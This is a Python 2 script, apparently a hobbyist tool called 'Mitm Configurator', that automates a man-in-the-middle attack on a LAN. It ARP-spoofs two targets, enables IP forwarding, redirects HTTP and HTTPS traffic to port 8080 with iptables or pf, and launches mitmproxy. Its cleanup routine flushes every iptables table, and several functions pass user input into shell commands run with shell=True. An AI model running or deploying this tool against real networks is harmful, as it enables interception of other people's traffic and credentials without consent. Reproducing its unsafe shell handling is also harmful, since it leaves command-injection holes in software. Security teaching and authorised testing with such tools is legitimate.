#!/usr/bin/python
###
#   Mitm Configurator is Python 2.7 script
#   used for configuring your system settings
#   for use with mitmproxy. All feedback appreciated.
###

import subprocess, sys, os, signal
from time import sleep
from termcolor import colored ## Required for colorful output in command prompt
from sys import platform as _platform


### VARS ###
ARP1 = 0
ARP2 = 0
p1 = 0
p2 = 0
interface = "wlan0"
MITMargs = " -T --host"
target1 = "192.168.1.1"
target2 = "192.168.1.2"
MITMCONFIGURATOR = colored('MITM CONFIGURATOR', 'white', attrs=['bold'])
welcomeMsg = "\n/=-=-=-=- " + MITMCONFIGURATOR + " -=-=-=-=-=-=\\\n|****Created by:Stephen | Ver 1.0.3 ****|\n\=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=/\n"
#######################



## COLORED PRINT METHODS ##
def print_status(str):
    print("[*] " + str)

def print_good(str):
    print((colored('[+]', 'green')) + " " + str)

def print_error(str):
    print((colored('[-]', 'red')) + " " + str)

def print_question(str):
    result = raw_input((colored('[?]', 'yellow')) + " " + str)
    return result
################################



#### START OF MAIN METHODS ####


## INIT METHOD: gets arpspoof info, no error checking
def get_arpspoof_info():
    global target1, target2
    print_status("Please enter two targets for arpspoof.")
    tempT = print_question("Target #1["+target1+"]: ")
    if tempT != "" and tempT != "\n":
        target1 = tempT
    tempT2 = print_question("Target #2["+target2+"]: ")
    if tempT2 != "" and tempT2 !="\n":
        target2 = tempT2

## INIT METHOD: gets desired interface
def get_interface():
    global interface
    interTEMP = print_question("Please enter your interface name["+interface+"]: ")

    if interTEMP != "" and interTEMP != "\n":
        interface = interTEMP

## INIT METHOD: gets mitm args, no error checking
def get_mitm_args():
    global MITMargs
    temp = print_question("Please enter arguments for mitmproxy["+MITMargs+"]: ")

    if temp != "" and temp != "\n":
        MITMargs = temp

#### Calls methods for initialization. Use over single methods
def begin_script():
    get_arpspoof_info()
    get_interface()
    get_mitm_args()
    print("\n") ## Creates nice line break after user values inputted

    start_arpspoof()
    check_arpspoof()
    config_IP()
    launch_MITM()
    print("\n") ## Creates nice line break after mitmproxy launch


## Starts two arpspoof subprocesses, no error checking in this method
def start_arpspoof():
    global ARP1, p1, ARP2, p2
    print_status("Attempting to start arpspoof with:")
    print_status("Interface: " + interface)
    print_status("Targets: " + target1 + " " + target2)

    ARP1 = "arpspoof -i " + interface + " -t " + target1 + " " + target2
    p1 = subprocess.Popen([ARP1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1, preexec_fn=os.setsid)
    ARP2 = "arpspoof -i " + interface + " -t " + target2 + " " + target1
    p2 = subprocess.Popen([ARP2], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=1, preexec_fn=os.setsid)

## Output of both Arpspoof subprocesses used to determine errors
def check_arpspoof():
    global out, p1, p2

    errorInterface = "arpspoof: libnet"
    errorIPaddr = "Segmentation fault"
    errorINIT = "00:00:00:00:00:00"
    errorUnknown = "arpspoof: "
    sleep(0.5)

    ## Checks first line of Arpspoof for known errors
    while True:
        error = "False"
        out =  p1.stderr.read(93) ## Size of error output
        if out == '' and p1.poll() != None:
                break

        if out != '':
            sys.stdout.flush()
            if errorInterface in out:
                print_error("Arpspoof failed to start. Check your selected interface.")
                error = "iface" ## Interface isn't detected on the system
                break
            if errorIPaddr in out:
                print_error("Arpspoof failed to start. Check your selected targets.")
                error = "ip" ## Most likely, the IP address is incorrect
                break
            if errorINIT in out:
                print_error("Arpspoof initialized improperly, but we can fix this. Rebooting arpspoof...")
                error = "init" ## Occasionally, I noticed the first run arpspoof incorrectly shows a MAC addr as all zeros
                break
            if errorUnknown in out:
                print_error("An unkown error occured. See output:")
                sys.stdout.write(out)
                cleanup()
                exit()
        break

    if error == "False": ## No error occured.
        sleep(0.5)
        print_good("Launched arpspoof!\n")
    elif error == "iface": ## Error in the interface.
        get_interface()
        start_arpspoof()
        check_arpspoof()
    elif error == "ip": ## Error in IP addresses
        get_arpspoof_info()
        start_arpspoof()
        check_arpspoof()
    elif error == 'init': ## Rare error where arpspoof initialized improperly, reboot fixes it.
        kill_arpspoof()
        print_status("Now rebooting arpspoof.")
        start_arpspoof()
        check_arpspoof()

## Configuring IPTables and IP Forwarding
def config_IP():
    print_status("Attempting to configure IP forwarding...")

    if _platform == "linux" or _platform == "linux2":
        IP4WD = "echo 1 > /proc/sys/net/ipv4/ip_forward"
        subprocess.Popen(IP4WD, shell=True)
        print_good("IP forwarding configured.\n")

        print_status("Attempting to configure IPTables...")
        IPT1 = "iptables -t nat -A PREROUTING -i " + interface + " -p tcp --dport 80 -j REDIRECT --to-port 8080"
        os.system(IPT1)
        IPT2 = "iptables -t nat -A PREROUTING -i " + interface + " -p tcp --dport 443 -j REDIRECT --to-port 8080"
        os.system(IPT2)
        sleep(1)
        print_good("IPTables configured.\n")

    if _platform == "darwin":
        subprocess.Popen(["sysctl -w net.inet.ip.forwarding=1"], shell=True, stdout=subprocess.PIPE)
        print_good("IP forwarding configured!\n")

        print_status("Attempting to configure packet routing...")
        pfconf = open("pf.conf", "w+")
        HTTP = "rdr on " + interface+ " inet proto tcp to any port 80 -> 127.0.0.1 port 8080\n"
        HTTPS = "rdr on " + interface+ " inet proto tcp to any port 443 -> 127.0.0.1 port 8080\n"
        pfconf.write(HTTP)
        pfconf.write(HTTPS)

        subprocess.Popen(["pfctl -f pf.conf"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.Popen(["pfctl -e"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pfconf.close()
        ## Possibly will need to enter edit for /etc/sudoers file here, but works without it apparently
        sleep(1)
        print_good("Packet routing configured!\n")


## launch MITMPROXY with given args
def launch_MITM():
    global MITMargs
    print_status("Now launching MITMProxy with arguments: " + MITMargs)
    MITMP ="mitmproxy " + MITMargs
    FNULL = open(os.devnull, 'w') ## Hides mitmproxy output, makes script cleaner.
    testMitmP = subprocess.Popen(MITMP, shell=True, stdout=FNULL, stderr=FNULL, stdin=FNULL) ##Checks for incorrects args (Test mitmproxy process)
    sleep(1.25)
    ReturnVal = testMitmP.poll() ## Check if the arguments worked in the test process
    try:
        testMitmP.terminate()
        kill_mitm()  ## Terminate test process, if possible, if this works, it is because the args worked
    except:
        pass
    if ReturnVal == 2: ## If args were incorrect, user is sent back to reenter them
        print_error("Error launching mitmproxy. Please check your arguments.");
        get_mitm_args()
        launch_MITM();
    else:
        os.system(MITMP); ## if the args worked, launch the real mitmproxy to be used




## CLEANUP METHOD: kills off all arpspoof processes
def kill_arpspoof():
    global p1, p2
    p1.terminate()
    p2.terminate()
    ## Kills launched arpspoof processes, but they exit after re-arping targets
    p3 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out1, err1 = p3.communicate()

    for line in out1.splitlines():
        if 'arpspoof' in line:
            pid = int(line.split(None, 1)[0])
            os.kill(pid, signal.SIGTERM)

    sleep(1)
    print_good("Arpspoof processes terminated.")

## CLEANUP METHOD: kills rare mitmproxy exsistence, mainly used in debug.
def kill_mitm():
    p3 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out1, err1 = p3.communicate()

    for line in out1.splitlines():
        if 'mitmproxy' in line:
            pidMITM = int(line.split(None, 1)[0])
            os.kill(pidMITM, signal.SIGTERM)
            print_good("Mitmproxy process terminated.") ## In IF statement because mitmproxy process not always present. Used mostly in debug.

## CLEANUP METHOD: Restores all IPtables and IP forwarding settings
def restore_IP_configs():
    if _platform == "linux" or _platform == "linux2":
        IPBACKWD = "echo 0 > /proc/sys/net/ipv4/ip_forward"
        subprocess.Popen(IPBACKWD, shell=True)
        IPTReset = ["iptables -F", "iptables -X", "iptables -t nat -F", "iptables -t nat -X","iptables -t mangle -F", "iptables -t mangle -X", "iptables -t raw -F", "iptables -t raw -X", "iptables -t security -F", "iptables -t security -X", "iptables -P INPUT ACCEPT", "iptables -P FORWARD ACCEPT", "iptables -P OUTPUT ACCEPT"]
        for i in IPTReset:
            os.system(i)

    if _platform == "darwin": ## Mac
        subprocess.Popen(["sysctl -w net.inet.ip.forwarding=0"], shell=True, stdout=subprocess.PIPE)
        subprocess.Popen(["pfctl -d"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        try:
            os.remove("pf.conf")
        except OSError:
            print_error("No pf.conf file found.")
    sleep(1)
    print_good("IP configurations restored.")


#### CLEANUP METHOD: MAIN (CALL UNLESS OTHERWISE NEEDED)
def cleanup():
    print_status("Beginning cleanup...")
    kill_arpspoof()
    kill_mitm()
    restore_IP_configs()
    sleep(1)
    print_good("Clean up complete.\n")




##Prints welcome message
def welcome_message():
	global welcomeMsg
	print(welcomeMsg)
	sleep(0.5)

	if(os.getuid() != 0):
 	   print_error("Oops! This script requires root privileges.")
 	   exit()
	begin_script()


## Final execution after cleanup
def exit_message():
	global welcomeMsg
	print_good("Thanks for using "  + MITMCONFIGURATOR + "!")
	sleep(1.25)
	exit()

###### END OF METHODS ######


#### INITIAL EXECUTION STARTS HERE ####
welcome_message()


## Runs after mitmproxy quit and can initiate cleanup
while True:
    response = print_question("Would you like to: \n\tRestart mitmproxy with same arguments(Y/y)?\n\tRestart after new configuration(C/c)?\n\tRevert all configuration changes?(R/r)?\n"+ (colored('[?]', 'yellow')) + ": ")
    print("\n")
    if response.lower() in ['y', 'yes']:
        launch_MITM()
    elif response.lower() in ['c']:
        cleanup()
        print_status("Beginning reconfigurement...")
        begin_script()
    elif response.lower() in ['r']:
        cleanup()
        break
    else:
        print_error("Unrecognized input. Try again.\n")


exit_message()
